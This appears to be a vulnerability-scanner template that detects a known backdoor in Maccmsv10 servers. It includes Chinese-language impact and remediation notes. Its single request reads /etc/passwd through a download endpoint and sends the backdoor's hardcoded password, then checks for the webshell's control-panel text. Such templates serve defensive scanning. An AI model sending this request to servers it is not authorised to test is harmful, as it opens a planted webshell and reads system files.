id: maccmsv10-backdoor

info:
  name: Maccmsv10 - Backdoor - 远程代码执行漏洞
  author: princechaddha
  severity: critical
  description: |
    该模板用于检测 Maccmsv10 - Backdoor - 远程代码执行漏洞。该类漏洞通常允许攻击者通过可控参数、接口调用或危险功能在目标服务端执行命令或代码。模板主要向 `/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1` 等路径发送探测请求，并根据响应中的 `扫描后门`、`反弹端口` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可在目标服务权限下执行系统命令或应用代码，读取、修改业务数据并部署持久化后门。
    - 若服务运行在高权限账户或可访问内网资源，漏洞可能进一步导致主机失陷和横向移动。
  remediation: |
    - 升级受影响产品到厂商修复版本，或应用官方补丁/安全配置基线。
    - 限制相关管理接口、调试接口或危险功能的访问来源，避免直接暴露到公网。
    - 排查异常进程、计划任务、WebShell、新增账号和外联记录，并轮换可能泄露的密钥与凭据。
  reference:
    - https://github.com/chaitin/xray/blob/master/pocs/maccmsv10-backdoor.yml
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  metadata:
    max-request: 1
  tags: maccmsv10,rce,backdoor,vuln

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"

    body: "getpwd=WorldFilledWithLove"

    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "扫描后门"
          - "反弹端口"
          - "文件管理"
        condition: and

      - type: status
        status:
          - 200
